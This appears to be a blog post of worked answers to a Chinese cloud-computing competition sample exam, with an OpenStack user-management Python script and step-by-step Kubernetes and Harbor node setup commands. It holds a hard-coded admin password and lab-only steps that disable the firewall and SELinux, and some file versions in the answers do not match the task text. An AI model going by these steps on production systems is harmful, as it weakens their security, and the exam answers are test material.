<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@controller python3]# python3 create_user.py</span><br><span class="line">请输入访问openstack平台控制节点IP地址：（xx.xx.xx.xx)</span><br><span class="line">192.168.100.x</span><br><span class="line">用户 guojibeisheng 创建成功,ID为dcb0fc7bacf54038b624463921123aed</span><br><span class="line">该平台的用户为：</span><br><span class="line">guojibeisheng</span><br><span class="line">admin</span><br><span class="line">myuser</span><br><span class="line">tom</span><br><span class="line">glance</span><br><span class="line">nova</span><br><span class="line">placement</span><br><span class="line">neutron</span><br><span class="line">heat</span><br><span class="line">heat_domain_admin</span><br><span class="line">cinder</span><br><span class="line">swift</span><br><span class="line">用户 guojibeisheng 已删除！</span><br><span class="line">[root@controller python3]# cat create_user.py</span><br><span class="line">import requests,json,time</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">*******************全局变量IP*****************************</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">执行代码前，请修改controller_ip的IP地址，与指定router，IP可以input，也可以写成静态</span></span><br><span class="line">controller_ip = input(&quot;请输入访问openstack平台控制节点IP地址：（xx.xx.xx.xx)\n&quot;)</span><br><span class="line"></span><br><span class="line">try:</span><br><span class="line">    url  = f&quot;http://&#123;controller_ip&#125;:5000/v3/auth/tokens&quot;</span><br><span class="line">    body = &#123;</span><br><span class="line">       &quot;auth&quot;: &#123;</span><br><span class="line">           &quot;identity&quot;: &#123;</span><br><span class="line">              &quot;methods&quot;:[&quot;password&quot;],</span><br><span class="line">              &quot;password&quot;: &#123;</span><br><span class="line">                  &quot;user&quot;: &#123;</span><br><span class="line">                     &quot;domain&quot;:&#123;</span><br><span class="line">                         &quot;name&quot;: &quot;Default&quot;</span><br><span class="line">                     &#125;,</span><br><span class="line">                      &quot;name&quot;: &quot;admin&quot;,</span><br><span class="line">                     &quot;password&quot;: &quot;000000&quot;</span><br><span class="line">                  &#125;</span><br><span class="line">              &#125;</span><br><span class="line">           &#125;,</span><br><span class="line">           &quot;scope&quot;: &#123;</span><br><span class="line">              &quot;project&quot;: &#123;</span><br><span class="line">                  &quot;domain&quot;: &#123;</span><br><span class="line">                     &quot;name&quot;: &quot;Default&quot;</span><br><span class="line">                  &#125;,</span><br><span class="line">                  &quot;name&quot;: &quot;admin&quot;</span><br><span class="line">              &#125;</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    headers = &#123;&quot;Content-Type&quot;: &quot;application/json&quot;&#125;</span><br><span class="line">    Token = requests.post(url, data=json.dumps(body), headers=headers).headers[&#x27;X-Subject-Token&#x27;]</span><br><span class="line">    headers = &#123;&quot;X-Auth-Token&quot;: Token&#125;</span><br><span class="line">except Exception as e:</span><br><span class="line">    print(f&quot;获取Token值失败，请检查访问云主机控制节点IP是否正确？输出错误信息如下：&#123;str(e)&#125;&quot;)</span><br><span class="line">    exit(0)</span><br><span class="line"></span><br><span class="line">class openstack_user_api:</span><br><span class="line">    def __init__(self, handers: dict, resUrl: str):</span><br><span class="line">        self.headers = handers</span><br><span class="line">        self.resUrl = resUrl</span><br><span class="line">    def create_users(self, user_name):</span><br><span class="line">        body = &#123;</span><br><span class="line">            &quot;user&quot;: &#123;</span><br><span class="line">                &quot;description&quot;: &quot;API create user!&quot;,</span><br><span class="line">                &quot;domain_id&quot;: &quot;default&quot;,</span><br><span class="line">                &quot;name&quot;: user_name</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        status_code = requests.post(self.resUrl, data=json.dumps(body), headers=self.headers).text</span><br><span class="line">        result = json.loads(requests.get(self.resUrl, headers=self.headers).text)</span><br><span class="line">        user_name = user_name</span><br><span class="line">        for i in result[&#x27;users&#x27;]:</span><br><span class="line">            if i[&#x27;name&#x27;] == user_name:</span><br><span class="line">                return f&quot;用户 &#123;user_name&#125; 创建成功,ID为&#123;i[&#x27;id&#x27;]&#125;&quot;</span><br><span class="line">    def list_users(self):</span><br><span class="line">        result = json.loads(requests.get(self.resUrl, headers=self.headers).text)</span><br><span class="line">        roles = []</span><br><span class="line">        for i in result[&#x27;users&#x27;]:</span><br><span class="line">            if i[&#x27;name&#x27;] not in roles:</span><br><span class="line">                roles.append(i[&#x27;name&#x27;])</span><br><span class="line">        return &quot;该平台的用户为：\n&quot;+&#x27;\n&#x27;.join(roles)</span><br><span class="line"></span><br><span class="line">    def get_user_id(self, user_name):</span><br><span class="line">        result = json.loads(requests.get(self.resUrl, headers=self.headers).text)</span><br><span class="line">        user_name = user_name</span><br><span class="line">        for i in result[&#x27;users&#x27;]:</span><br><span class="line">            if i[&#x27;name&#x27;] == user_name:</span><br><span class="line">                return (f&quot;用户 &#123;user_name&#125; 的ID为&#123;i[&#x27;id&#x27;]&#125;&quot;)</span><br><span class="line"></span><br><span class="line">    def delete_user(self, user_name):</span><br><span class="line">        result = json.loads(requests.get(self.resUrl, headers=self.headers).text)</span><br><span class="line">        for i in result[&#x27;users&#x27;]:</span><br><span class="line">            if i[&#x27;name&#x27;] == user_name:</span><br><span class="line">                i = i[&#x27;id&#x27;]</span><br><span class="line">                status_code = requests.delete(f&#x27;http://&#123;controller_ip&#125;:5000/v3/users/&#123;i&#125;&#x27;, headers=self.headers)</span><br><span class="line">                return f&quot;用户 &#123;user_name&#125; 已删除！&quot;</span><br><span class="line"></span><br><span class="line">openstack_user_api = openstack_user_api(headers, f&quot;http://&#123;controller_ip&#125;:5000/v3/users&quot;)</span><br><span class="line"></span><br><span class="line">print(openstack_user_api.create_users(&quot;guojibeisheng&quot;))</span><br><span class="line">print(openstack_user_api.list_users())</span><br><span class="line">print(openstack_user_api.delete_user(&quot;guojibeisheng&quot;))</span><br></pre></td></tr></table></figure>

<h1 id="B模块：容器的编排与运维（样题）"><a href="#B模块：容器的编排与运维（样题）" class="headerlink" title="B模块：容器的编排与运维（样题）"></a>B模块：容器的编排与运维（样题）</h1><p>说明：本任务提供有4台服务器master、node1、node2和harbor，都安装了centos7.5操作系统，在&#x2F;opt&#x2F;centos目录下有CentOS-7-x86_64-DVD-1804系统光盘文件所有文件，在&#x2F;opt&#x2F;containerk8s目录下有本次容器云运维所需的所有文件。</p>
<h2 id="任务-1-容器云平台环境初始化"><a href="#任务-1-容器云平台环境初始化" class="headerlink" title="任务 1 容器云平台环境初始化"></a>任务 1 容器云平台环境初始化</h2><p><strong>①master 节点主机名设置为 master、node1 节点主机名设置为 node1、node2 节点主机名设置为 node2、harbor 节点主机名设置为 harbor,所有节点关闭 swap，并配置 hosts 映射。</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment">#设置主机名</span></span></span><br><span class="line">[root@localhost ~]# hostnamectl set-hostname master</span><br><span class="line">[root@localhost ~]# hostnamectl set-hostname node1</span><br><span class="line">[root@localhost ~]# hostnamectl set-hostname node2</span><br><span class="line">[root@localhost ~]# hostnamectl set-hostname harbor</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment">#主机映射</span></span></span><br><span class="line">[root@master ~]# cat /etc/hosts</span><br><span class="line">127.0.0.1   localhost localhost.localdomain localhost4 localhost4.localdomain4</span><br><span class="line">::1         localhost localhost.localdomain localhost6 localhost6.localdomain6</span><br><span class="line">192.168.157.50 master</span><br><span class="line">192.168.157.51 node1</span><br><span class="line">192.168.157.52 node2</span><br><span class="line">192.168.157.53 harbor</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment">#关闭swap</span></span></span><br><span class="line">[root@localhost ~]# swapoff -a</span><br><span class="line">[root@localhost ~]# vi + /etc/fstab </span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash"><span class="comment"># /etc/fstab</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Created by anaconda on Mon Apr 17 08:27:55 2023</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash"><span class="comment"># Accessible filesystems, by reference, are maintained under &#x27;/dev/disk&#x27;</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">See man pages fstab(5), findfs(8), mount(8) and/or blkid(8) <span class="keyword">for</span> more info</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash">/dev/mapper/centos-root /                       xfs     defaults        0 0</span></span><br><span class="line">UUID=e1892f7d-c16f-47b3-888b-77d0af3521f6 /boot                   xfs     defaults        0 0</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">/dev/mapper/centos-swap swap                    swap    defaults        0 0</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">关闭防火墙</span></span><br><span class="line">[root@localhost ~]# systemctl stop firewalld &amp;&amp; systemctl disable firewalld</span><br><span class="line">Removed symlink /etc/systemd/system/multi-user.target.wants/firewalld.service.</span><br><span class="line">Removed symlink /etc/systemd/system/dbus-org.fedoraproject.FirewallD1.service.</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">关闭安全策略</span></span><br><span class="line">[root@localhost ~]# setenforce 0</span><br><span class="line">[root@localhost ~]# vi /etc/selinux/config</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">This file controls the state of SELinux on the system.</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">SELINUX= can take one of these three values:</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">    enforcing - SELinux security policy is enforced.</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">    permissive - SELinux prints warnings instead of enforcing.</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">    disabled - No SELinux policy is loaded.</span></span><br><span class="line">SELINUX=permissive</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">SELINUXTYPE= can take one of three two values:</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">    targeted - Targeted processes are protected,</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">    minimum - Modification of targeted policy. Only selected processes are protected.</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">    mls - Multi Level Security protection.</span></span><br><span class="line">SELINUXTYPE=targeted</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p><strong>②将提供的 CentOS-7-x86_64-DVD-1804.iso 和 qdkills_cloud_paas.iso 光盘镜像文件移动到 master 节点 &#x2F;root 目录下，然后在 &#x2F;opt 目录下使用命令创建 centos 目录和 paas 目录，并将镜像文件 CentOS-7-x86_64-DVD-1804.iso 永久挂载到 centos 目录下，将镜像文件qdskills_cloud_paas.iso 永久挂载到 &#x2F;opt&#x2F;paas 目录下。</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@localhost ~]# mkdir /opt/centos</span><br><span class="line">[root@localhost ~]# mkdir /opt/paas</span><br><span class="line">[root@localhost ~]# vi + /etc/fstab</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash"><span class="comment"># /etc/fstab</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Created by anaconda on Mon Apr 17 08:27:55 2023</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash"><span class="comment"># Accessible filesystems, by reference, are maintained under &#x27;/dev/disk&#x27;</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">See man pages fstab(5), findfs(8), mount(8) and/or blkid(8) <span class="keyword">for</span> more info</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash">/dev/mapper/centos-root /                       xfs     defaults        0 0</span></span><br><span class="line">UUID=e1892f7d-c16f-47b3-888b-77d0af3521f6 /boot                   xfs     defaults        0 0</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">/dev/mapper/centos-swap swap                    swap    defaults        0 0</span></span><br><span class="line">/root/chinaskills_cloud_paas.iso /opt/paas iso9660 defaults 0 0</span><br><span class="line">/root/CentOS-7-x86_64-DVD-1804.iso /opt/centos iso9660 defaults 0 0</span><br><span class="line">[root@localhost ~]# mount -a</span><br><span class="line">mount: /dev/loop0 is write-protected, mounting read-only</span><br><span class="line">mount: /dev/loop1 is write-protected, mounting read-only</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><strong>③在 master 节点首先将系统自带的 yum 源移动到&#x2F;home 目录，然后为 master 节点配置本地 yum 源，yum 源文件名为 local.repo。</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@master ~]# mv /etc/yum.repos.d/CentOS-* /home/</span><br><span class="line">[root@master ~]# vi /etc/yum.repos.d/local.repo</span><br><span class="line">[centos]</span><br><span class="line">name=centos</span><br><span class="line">baseurl=file:///opt/centos</span><br><span class="line">gpgcheck=0</span><br><span class="line">enabled=1</span><br><span class="line">[paas]</span><br><span class="line">name=centos</span><br><span class="line">baseurl=file:///opt/paas/kubernetes-repo</span><br><span class="line">gpgcheck=0</span><br><span class="line">enabled=1</span><br><span class="line"></span><br><span class="line">[root@master ~]# yum repolist</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p><strong>④在 master 节点安装 ftp 服务，将 ftp 共享目录设置为 &#x2F;opt&#x2F;。</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@master ~]# yum install -y vsftpd</span><br><span class="line">[root@master ~]# echo &quot;anon_root=/opt&quot; &gt;&gt; /etc/vsftpd/vsftpd.conf</span><br><span class="line">[root@master ~]# systemctl enable --now vsftpd</span><br><span class="line">Created symlink from /etc/systemd/system/multi-user.target.wants/vsftpd.service to /usr/lib/systemd/system/vsftpd.service.</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>⑤为 node1 节点和 node2 节点分别配置 ftp 源，yum 源文件名称为 ftp.repo，其中 ftp 服务器地址为 master 节点,配置 ftp 源时不要写 IP 地址，配置之后，两台机器都安装 kubectl 包作为安装测试。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@master ~]# mv /etc/yum.repos.d/CentOS-* /home/</span><br><span class="line">[root@localhost ~]# cat /etc/yum.repos.d/ftp.repo</span><br><span class="line">[centos]</span><br><span class="line">name=centos</span><br><span class="line">baseurl=ftp://master/centos</span><br><span class="line">gpgcheck=0</span><br><span class="line">enabled=1</span><br><span class="line">[paas]</span><br><span class="line">name=paas</span><br><span class="line">baseurl=ftp://master/paas/kubernetes-repo</span><br><span class="line">gpgcheck=0</span><br><span class="line">enabled=1</span><br><span class="line"></span><br><span class="line">[root@localhost ~]# yum install -y kubectl</span><br></pre></td></tr></table></figure>



<p>⑥在 master 节点上部署 chrony 服务器，允许其它节点同步时间，启动服务并设置为开机自启动；在其他节点上指定 master 节点为上游 NTP 服务器，重启服务并设为开机自启动。</p>
<p>master节点</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">[root@master ~]# vi /etc/chrony.conf</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Use public servers from the pool.ntp.org project.</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Please consider joining the pool (http://www.pool.ntp.org/join.html).</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">server 0.centos.pool.ntp.org iburst</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">server 1.centos.pool.ntp.org iburst</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">server 2.centos.pool.ntp.org iburst</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">server 3.centos.pool.ntp.org iburst</span></span><br><span class="line">server master iburst</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Record the rate at <span class="built_in">which</span> the system clock gains/losses <span class="keyword">time</span>.</span></span><br><span class="line">driftfile /var/lib/chrony/drift</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Allow the system clock to be stepped <span class="keyword">in</span> the first three updates</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="keyword">if</span> its offset is larger than 1 second.</span></span><br><span class="line">makestep 1.0 3</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Enable kernel synchronization of the real-time clock (RTC).</span></span><br><span class="line">rtcsync</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Enable hardware timestamping on all interfaces that support it.</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">hwtimestamp *</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Increase the minimum number of selectable sources required to adjust</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">the system clock.</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">minsources 2</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Allow NTP client access from <span class="built_in">local</span> network.</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">allow 192.168.0.0/16</span></span><br><span class="line">allow 192.168.157.0/24</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Serve <span class="keyword">time</span> even <span class="keyword">if</span> not synchronized to a <span class="keyword">time</span> <span class="built_in">source</span>.</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="built_in">local</span> stratum 10</span></span><br><span class="line">local stratum 10</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Specify file containing keys <span class="keyword">for</span> NTP authentication.</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">keyfile /etc/chrony.keys</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Specify directory <span class="keyword">for</span> <span class="built_in">log</span> files.</span></span><br><span class="line">logdir /var/log/chrony</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Select <span class="built_in">which</span> information is logged.</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="built_in">log</span> measurements statistics tracking</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment">#重启服务</span></span></span><br><span class="line">[root@localhost ~]# systemctl restart chronyd</span><br><span class="line">[root@localhost ~]# systemctl enable chronyd</span><br><span class="line">[root@localhost ~]# chronyc sources</span><br></pre></td></tr></table></figure>

<p>node节点</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@localhost ~]# cat /etc/chrony.conf</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Use public servers from the pool.ntp.org project.</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Please consider joining the pool (http://www.pool.ntp.org/join.html).</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">server 0.centos.pool.ntp.org iburst</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">server 1.centos.pool.ntp.org iburst</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">server 2.centos.pool.ntp.org iburst</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">server 3.centos.pool.ntp.org iburst</span></span><br><span class="line">server master iburst</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Record the rate at <span class="built_in">which</span> the system clock gains/losses <span class="keyword">time</span>.</span></span><br><span class="line">driftfile /var/lib/chrony/drift</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Allow the system clock to be stepped <span class="keyword">in</span> the first three updates</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="keyword">if</span> its offset is larger than 1 second.</span></span><br><span class="line">makestep 1.0 3</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Enable kernel synchronization of the real-time clock (RTC).</span></span><br><span class="line">rtcsync</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Enable hardware timestamping on all interfaces that support it.</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">hwtimestamp *</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Increase the minimum number of selectable sources required to adjust</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">the system clock.</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">minsources 2</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Allow NTP client access from <span class="built_in">local</span> network.</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">allow 192.168.0.0/16</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Serve <span class="keyword">time</span> even <span class="keyword">if</span> not synchronized to a <span class="keyword">time</span> <span class="built_in">source</span>.</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="built_in">local</span> stratum 10</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Specify file containing keys <span class="keyword">for</span> NTP authentication.</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">keyfile /etc/chrony.keys</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Specify directory <span class="keyword">for</span> <span class="built_in">log</span> files.</span></span><br><span class="line">logdir /var/log/chrony</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Select <span class="built_in">which</span> information is logged.</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="built_in">log</span> measurements statistics tracking</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment">#重启服务</span></span></span><br><span class="line">[root@localhost ~]# systemctl restart chronyd</span><br><span class="line">[root@localhost ~]# systemctl enable chronyd</span><br><span class="line">[root@localhost ~]# chronyc sources</span><br></pre></td></tr></table></figure>



<p>⑦为四台服务器设置免密登录，保证服务器之间能够互相免密登录。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@localhost ~]# ssh-keygen</span><br><span class="line">Generating public/private rsa key pair.</span><br><span class="line">Enter file in which to save the key (/root/.ssh/id_rsa):</span><br><span class="line">Created directory &#x27;/root/.ssh&#x27;.</span><br><span class="line">Enter passphrase (empty for no passphrase):</span><br><span class="line">Enter same passphrase again:</span><br><span class="line">Your identification has been saved in /root/.ssh/id_rsa.</span><br><span class="line">Your public key has been saved in /root/.ssh/id_rsa.pub.</span><br><span class="line">The key fingerprint is:</span><br><span class="line">SHA256:qveHAExYRiPQVv5rlsI3owC/pO72K9ZK+pOJFPnPfFQ root@node1</span><br><span class="line">The key&#x27;s randomart image is:</span><br><span class="line">+---[RSA 2048]----+</span><br><span class="line">|.o.=*            |</span><br><span class="line">|  ++..           |</span><br><span class="line">| ..o.            |</span><br><span class="line">| o  o.   E       |</span><br><span class="line">|. o  .. S        |</span><br><span class="line">| + o  .=         |</span><br><span class="line">|.o=o* @. .       |</span><br><span class="line">|+*++ @.+. .      |</span><br><span class="line">|B=*++.....       |</span><br><span class="line">+----[SHA256]-----+</span><br><span class="line"></span><br><span class="line">[root@master ~]# ssh-copy-id root@node1</span><br><span class="line">/usr/bin/ssh-copy-id: INFO: Source of key(s) to be installed: &quot;/root/.ssh/id_rsa.pub&quot;</span><br><span class="line">/usr/bin/ssh-copy-id: INFO: attempting to log in with the new key(s), to filter out any that are already installed</span><br><span class="line">/usr/bin/ssh-copy-id: INFO: 1 key(s) remain to be installed -- if you are prompted now it is to install the new keys</span><br><span class="line">root@node1&#x27;s password:</span><br><span class="line"></span><br><span class="line">Number of key(s) added: 1</span><br><span class="line"></span><br><span class="line">Now try logging into the machine, with:   &quot;ssh &#x27;root@node1&#x27;&quot;</span><br><span class="line">and check to make sure that only the key(s) you wanted were added.</span><br><span class="line"></span><br><span class="line">[root@master ~]# ssh-copy-id root@node2</span><br><span class="line">/usr/bin/ssh-copy-id: INFO: Source of key(s) to be installed: &quot;/root/.ssh/id_rsa.pub&quot;</span><br><span class="line">/usr/bin/ssh-copy-id: INFO: attempting to log in with the new key(s), to filter out any that are already installed</span><br><span class="line">/usr/bin/ssh-copy-id: INFO: 1 key(s) remain to be installed -- if you are prompted now it is to install the new keys</span><br><span class="line">root@node2&#x27;s password:</span><br><span class="line">Number of key(s) added: 1</span><br><span class="line"></span><br><span class="line">Now try logging into the machine, with:   &quot;ssh &#x27;root@node2&#x27;&quot;</span><br><span class="line">and check to make sure that only the key(s) you wanted were added.</span><br><span class="line"></span><br><span class="line">[root@master ~]# ssh-copy-id root@harbor</span><br><span class="line">/usr/bin/ssh-copy-id: INFO: Source of key(s) to be installed: &quot;/root/.ssh/id_rsa.pub&quot;</span><br><span class="line">/usr/bin/ssh-copy-id: INFO: attempting to log in with the new key(s), to filter out any that are already installed</span><br><span class="line">/usr/bin/ssh-copy-id: INFO: 1 key(s) remain to be installed -- if you are prompted now it is to install the new keys</span><br><span class="line">root@harbor&#x27;s password:</span><br><span class="line"></span><br><span class="line">Number of key(s) added: 1</span><br><span class="line"></span><br><span class="line">Now try logging into the machine, with:   &quot;ssh &#x27;root@harbor&#x27;&quot;</span><br><span class="line">and check to make sure that only the key(s) you wanted were added.</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h2 id="任务2-k8s-搭建任务"><a href="#任务2-k8s-搭建任务" class="headerlink" title="任务2  k8s 搭建任务"></a>任务2  k8s 搭建任务</h2><p>①在所有节点上安装dokcer-ce,并设置为开机自启动。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment">#所有节点</span></span></span><br><span class="line"></span><br><span class="line">[root@master ~]# yum install -y docker docker-ce</span><br><span class="line">[root@master ~]# systemctl enable --now docker</span><br></pre></td></tr></table></figure>



<p>②所有节点配置阿里云镜像加速地址(<a href="https://7hw6x2is.mirror.aliyuncs.com)并把启动引擎设置为systemd,配置成功后加载配置文件并重启docker服务./">https://7hw6x2is.mirror.aliyuncs.com)并把启动引擎设置为systemd，配置成功后加载配置文件并重启docker服务。</a></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@master ~]# cat /etc/docker/daemon.json</span><br><span class="line">&#123;</span><br><span class="line">  &quot;insecure-registries&quot;: [&quot;192.168.157.53&quot;],</span><br><span class="line">  &quot;registry-mirrors&quot;: [&quot;https://7hw6x2is.mirror.aliyuncs.com&quot;],</span><br><span class="line">  &quot;exec-opts&quot;: [&quot;native.cgroupdriver=systemd&quot;]</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">[root@master ~]# systemctl restart docker</span><br></pre></td></tr></table></figure>



<p>③在master节点&#x2F;opt&#x2F;images目录下使用tar归档文件载入镜像。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@master ~]# for i in $(ls /opt/paas/images | grep tar) ; do docker load -i /opt/paas/images/$i ;done</span><br></pre></td></tr></table></figure>



<p>④在master节点使用 &#x2F;opt&#x2F;docker-compose&#x2F;v2.10.2-docker-compose-linux-x86_64文件安装docker-compose。安装完成后执行docker-compose version命令。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@localhost opt]# cp -p /opt/paas/docker-compose/v1.25.5-docker-compose-Linux-x86_64 /usr/local/bin/docker-compose</span><br></pre></td></tr></table></figure>



<p>⑤在master节点解压&#x2F;opt&#x2F;harbor&#x2F; harbor-offline-installer-v2.5.3.tgz离线安装包，然后安装harbor仓库，并修改相应的yml文件，使各节点默认docker仓库为harbor仓库地址。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">[root@localhost opt]# tar -zxvf harbor-offline-installer-v2.1.0.tgz</span><br><span class="line">harbor/harbor.v2.1.0.tar.gz</span><br><span class="line">harbor/prepare</span><br><span class="line">harbor/LICENSE</span><br><span class="line">harbor/install.sh</span><br><span class="line">harbor/common.sh</span><br><span class="line">harbor/harbor.yml.tmpl</span><br><span class="line">[root@localhost opt]# cd harbor</span><br><span class="line">[root@localhost harbor]# ls</span><br><span class="line">common.sh  harbor.v2.1.0.tar.gz  harbor.yml.tmpl  install.sh  LICENSE  prepare</span><br><span class="line">[root@localhost harbor]# mv harbor.yml.tmpl harbor.yml</span><br><span class="line">[root@localhost harbor]# vi harbor.yml</span><br><span class="line">[root@harbor harbor]# cat harbor.yml</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Configuration file of Harbor</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">The IP address or hostname to access admin UI and registry service.</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">DO NOT use localhost or 127.0.0.1, because Harbor needs to be accessed by external clients.</span></span><br><span class="line">hostname: 192.168.157.50   ##修改IP地址</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">http related 